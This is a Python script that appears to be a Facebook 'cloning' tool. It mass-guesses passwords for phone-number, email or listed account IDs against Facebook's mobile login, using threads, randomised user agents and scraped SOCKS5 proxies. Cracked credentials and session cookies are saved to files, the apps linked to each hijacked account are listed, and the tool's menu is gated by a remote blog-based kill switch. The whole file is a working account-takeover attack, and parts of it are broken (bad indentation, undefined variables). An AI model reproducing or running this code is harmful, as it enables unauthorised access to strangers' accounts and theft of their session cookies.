import os
import sys
import time
import requests
import uuid
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        #os.system('pip install requests futures==2 > /dev/null')

from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
try:
	os.system("rm -rf .socks5.txt")
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.socks5.txt','w').write(prox) 
except Exception as e:
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[MX')

ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
warna1 = random.choice(my_color)
warna2 = random.choice(my_color)
warna3 = random.choice(my_color)
warna4 = random.choice(my_color)
warna5 = random.choice(my_color)
warna6 = random.choice(my_color)
gy = [YELLOW,GREEN]
gyc = random.choice(gy)
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
logo =                                          ("""   
\033[0;92m╔══════════════════════════════════════════════╗
\033[0;32m║ ███    ██  \033[0;31m█████  \033[0;93m██    ██  \033[0;32m█████  \033[0;31m███    ██\033[0;92m ║
\033[0;32m║ ████   ██ \033[0;31m██   ██  \033[0;93m██  ██  \033[0;32m██   ██ \033[0;31m████   ██\033[0;92m ║
\033[0;32m║ ██ ██  ██ \033[0;31m███████   \033[0;93m████   \033[0;32m███████ \033[0;31m██ ██  ██\033[0;92m ║
\033[0;32m║ ██  ██ ██ \033[0;31m██   ██    \033[0;93m██    \033[0;32m██   \033[0;32m██ \033[0;31m██  ██ ██\033[0;92m ║
\033[0;92m║ ██   ████ \033[0;31m██   ██    \033[0;93m██    \033[0;32m██   \033[0;32m██ \033[0;31m██   ████\033[0;92m ║
\033[0;92m╚══════════════════════════════════════════════╝
\033[0;92m╔═══════════════════════════════════════════╗\033[0;92m╔═══╗
\033[0;92m║➣\033[0;31m DEVOLPER   :   \033[0;34m       MR. NAYAN          ║\033[0;32m║\033[1;31m N \033[1;32m║
\033[0;92m║➣\033[0;33m FACEBOOK   :    \033[0;35m      Mohammad Nayan     ║\033[0;32m║\033[1;312m A\033[0;92m ║
\033[0;92m║═══════════════════════════════════════════║\033[0;32m║\033[1;34m Y\033[0;92m ║
\033[0;92m║➣\033[0;91m WHATSAPP   :    \033[0;92m      01615298449        ║\033[0;32m║\033[1;93m A\033[0;92m ║
\033[0;92m║➣\033[0;93m GITHUB     :     \033[0;94m     MR-NAYAN-404       ║\033[0;92m║\033[1;92m N\033[0;92m ║
\033[0;92m║➣\033[0;94m TOOLS      :      \033[0;93m    Public Tool        ║\033[0;92m║ 😘║
\033[0;92m╚═══════════════════════════════════════════╝\033[0;92m╚═══╝               
""")
def linex():
        print(50*'_')
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.000009)
def clear():
	os.system('clear')
	jalan (logo)
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\r{so}YOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\r 😘® %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))

loop=0
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
def menu():
	
	os.system("clear")
	clear()
	#lo("\t   LOADING SYSTEM")
	#clear()
	
	print ("\033[1;97m[1]\033[1;33m FILE CLONING ")
	print ("\033[1;97m[2]\033[1;33m RANDOM CLONEING")
	print ("\033[1;97m[3]\033[1;33m EMAIL CLONEING")
	print ("\033[1;97m[4]\033[1;33m Owner Facebook ID")
	ot = input('\n   \x1b[1;32m Choose option >>> ')
	if ot == '1':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100008255177183')
		File()
	if ot == '2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100008255177183')
		rndm()
	if ot == '3':
		mail()
	if ot == '4':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100008255177183')
		menu()
		
	else:
		menu()
def rndm():
	user=[]
	print (f"{warna1}")
	clear()
	
	print(gyc)
	print ("""0191, 0182, 0172, 0133, 0144
""")
	cod = input('\n INPUT YOUR SIM CODE: ')
	if len(str(cod)) == 4:
		pass
	else:
		print('\n\n \033[1;33mINCORRECT SIM CODE PLEASE ENTER 4 DIGIT SIM CODE')
		time.sleep(2)
		menu()
	print (f"{warna3}")
	clear()
	print(gyc)
	limit = int(input(' INPUT LIMIT: '))
	for num in range (limit):
		nm = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nm)
	print (f"{warna5}")
	clear()
	print(gyc)
	linex()
	print ("Do you want to use custom password: y/n")
	csp = input('\n ENTER YES OR NO : ')
	
	sai = []
	if csp in ['y','Y','yes','Yes','1']:
		psx = int(input(" Enter Password Limit: "))
		for sa in range(psx):
			pww = input(f"{so} Enter Password: ")
			sai.append(pww)
	else:
		pass
	with ThreadPool(max_workers=30) as riyad:
		print(gyc)
		clear()
		
		ln = str(len(user))
		print(50*'_')
		print('[π] TOTAL IDS: '+ln)
		print('[π] YOUR SIM CODE : '+cod)
		print(50*'_')
		for nhm in user:
			uid = cod+nhm
			pwx = [uid,uid[3:],uid[0:6],uid[0:7],uid[0:8]]
			for psc in sai:
				pwx.append(psc)
			riyad.submit(c,uid,pwx,ln)
	print(50*'_')
	print(' [π] Crack process has been completed')
	print(50*'_')
	exit()
def mail():
	user=[]
	print (f"{warna4}")
	clear()
	print(gyc)
	first = input(' [π] Email FARST NAME: ')
	last = input(' [π] Email LAST NAME :  ')
	print (f"{warna}")
	clear()
	print(gyc)
	print (' [1] Gmail \n [2] Yahoo ')
	mnum = (input ('Enter 1 Or 2:  '))
	if '1' in mnum:
		doamin = ('@gmail.com')
	elif '2' in mnum:
		doamin = ('@yahoo.com')
	limit = int(input('[π]EXAMPLE: 3000, 5000, 15000, 20000\nCHOOSE CLONING LIMIT : '))
	for nmbr in range(limit):
		nm = ''.join(random.choice(string.digits) for _ in range(1,4))
		user.append(nm)
	with ThreadPool(max_workers=30) as riyad:
		print(gyc)
		clear()
		ln = str(len(user))
		print('[π]TOTAL IDS: '+ln)
		print ("ID BUBBLE PRINT HOBE EMAIL CLONEING AR KARONE")
		print(50*'_')
		print("")
		for nm in user:
			uid = first+last+nm+doamin
			pwx = [first,first+last,'@@'+first+'123','@@'+first+'11','@@'+first+'1122',first+'1234',first+'1122',first+'11','@@'+first+'12345',first+'12345']
			riyad.submit(c,uid,pwx,ln)
	print(50*'_')
	print(' [π] Crack process has been completed')
	print(50*'_')
	exit()
def File():
	clear()
	print(f' \n ➥➥➣\033[42m\033[1;31m Example: /sdcard/nayan.txt\033[40m\033[00m\n')
	file = input(' Put file path\033[1;37m: ')
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		exit(' File location not found ')
	linex()
	print(' Select Password Crack menu \n\n [1] Crack with auto password \n \n [2] Crack with manual password');linex()
	cs = input('\n   \x1b[1;33m Choose option >>> ')
	plist=[]
	if cs in ['y','Y','yes','Yes','1','01']:
		
		plist.append('First Last')
		plist.append('first last')
		#plist.append('firstlast')
		plist.append('first123')
		plist.append('first12345')
		plist.append('first786')
		plist.append('firstlast123')
		plist.append('first1122')
		plist.append('first@@@')
		plist.append('first@@@@')
		plist.append('first1234')
		plist.append('first0099')
		plist.append('first2023')
		plist.append('first@@11')
		plist.append('first@123')
		plist.append('last123')
		plist.append('last1234')
		plist.append('last2023')
		plist.append('last1122')
	elif cs in ['2','02']:
		clear()
		try:
			ps_limit = int(input(' How many passwords do you want to add ? '))
		except:
			ps_limit =1
		print('\033[1;32m exp: first last,firtslast,first123')
		for i in range(ps_limit):
			plist.append(input(f' Put password {i+1}: '))
		
		#plist1=open('first', 'r').read().splitlines()
	
	with ThreadPool(max_workers=30) as crack_submit:
		total_ids = str(len(fo))
		clear()
		
		print('\033[42m\033[1;31m                  [MR. NAYAN]                  \033[40m\033[00m')
	print(f'          {m}N {k}A {h}Y {u}A {b}N {u}  🔥 {b}E {u}N {h} J{k} O{m} Y{b}')
	print('\033[42m\033[1;31m                  [MR. NAYAN]                  \033[40m\033[00m')
	print ("Total Ids = "+total_ids)
	print(f'➥➥➣Result {h}OK{u} Save In : {h}OK/%s {b}'%(okc))
	print(f'➥➥➣Result {m}CP{b} Save In : {m}CP/%s {h}'%(cpc))
	print(f'➥➥➣Airplane Mode on 10 Seconds For {h}1k{u} Idz')
	print('\033[42m\033[1;31m                  [MR. NAYAN]                  \033[40m\033[00m')
		linex()
		print("")
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			crack_submit.submit(ffb,ids,names,passlist)
	print("")
	linex()
	print(' The process has completed')
	print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' Press enter to back ')
	menu()

def c(uid,pwx,ln):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            wa = random.choice(my_color)
            sys.stdout.write(f'    \r%s[NAYAN] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            devices = ["iPhone", "Samsung", "Nexus", "Pixel", "iPad", "Surface", "Kindle"]
            browsers = ["Chromium", "Not=A?Brand"]
            platforms = ["Android", "Windows", "MacOS", "Linux"]
    
            header_freefb = {
            "authority": 'mbasic.facebook.com',
            "method": 'POST',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            "origin": 'https://mbasic.facebook.com',
            "referer": 'https://mbasic.facebook.com/',
            "sec-ch-ua": f'"{random.choice(browsers)}";v="{str(random.randint(1,20)) + "." + str(random.randint(0,10))}"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": f'"{random.choice(platforms)}"',
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?1',
            "upgrade-insecure-requests": '1',
            "user-agent": f'Mozilla/5.0 ({random.choice(platforms)} {random.randint(1,20)}; {random.choice(devices)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(1,20)) + "." + str(random.randint(0,10))} Mobile Safari/537.36'}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
          #  lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
         #   log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
            	open('NAYAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
            #	botok(uid,ps)
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[65:80]
            	print('\033[1;92mNAYAN-OK[💥]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m💦\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('NAYAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('NAYAN-coki.txt', 'a').write(coki+'\n')
            	cek_apk(session,coki)
            	oks.append(cid)
            	break
            elif 'checkpoint' in log_cookies:
            	#botcp(uid,ps)
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(NAYAN-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('NAYAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            #	print (header_freefb)
            	continue
        loop+=1
        
        #sys.stdout.write('\r%s   [NAYAN] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(wa,loop,tl,len(oks),len(cps))),
       # sys.stdout.flush()
    except requests.exceptions.ConnectionError:
        time.sleep(10)
        pass


def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('    \r\r\033[1;37m [NAYAN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ses = requests.Session()
        
        
        url = 'mbasic.facebook.com'
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                try:
                        last1 = names.split(' ')[2]
                except:
                	last1 = 'ahmed'
          #      if len(first) == 2:
              #  	first = last
           #     	last = last1
    #            else:
        #        	pass
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        xx = open('.socks5.txt','r').read().splitlines()
                        proxy = {'http': 'socks5://'+random.choice(xx)}
                        ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 8A Pro Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
                        link = ses.get(f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr").text
                        date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'pass': pas, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
                        head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
                        bx = ses.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head,proxies=proxy)
                        
                        Aking=ses.cookies.get_dict()
                        if "c_user" in Aking:
                                print('\r\r\033[1;32m [NAYAN-OK] %s | %s'%(ids,pas))
                                open('/sdcard/STEST-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [NAYAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/STEST-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                        	
                              #  print(ids,pas)
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
        
        
def toolscontrol():
	blo = "https://apppppapppppp"
	gr = "appp.blogspot.com/20"
	rr = "23/02/got.html"

	v = "update11"
	vv = "menu11"
	vvv = "of11"
	peo = requests.get(f"{blo}{gr}{rr}").text
	if v in peo:
		update ()
	elif vv in peo:
		menu()
	elif "of11" in peo:
		clear()
		jalan (" THIS TOOLS IS NOT WORKING PLEASE WAIT FOR NEXT UPDATE")
		time.sleep(1)
		os.system('xdg-open https://facebook.com/BCM.049')
		exit()
	else:
		exit()

def update():
  
  clear()
  print (' \033[0;93mPLEASE WAIT FOR UPDATE')
  time.sleep(2)
  print ("\033[1;32m")
  os.system("git pull")
  os.system("git pull")
  os.system("git pull")
  time.sleep(3)
  print ("")
  print ('\033[1;32mUPDATE SUCCESSFUL')
  time.sleep(2)
  menu()
if __name__=='__main__':
	try:os.system('touch .socks5.txt')
	except:pass
	toolscontrol()
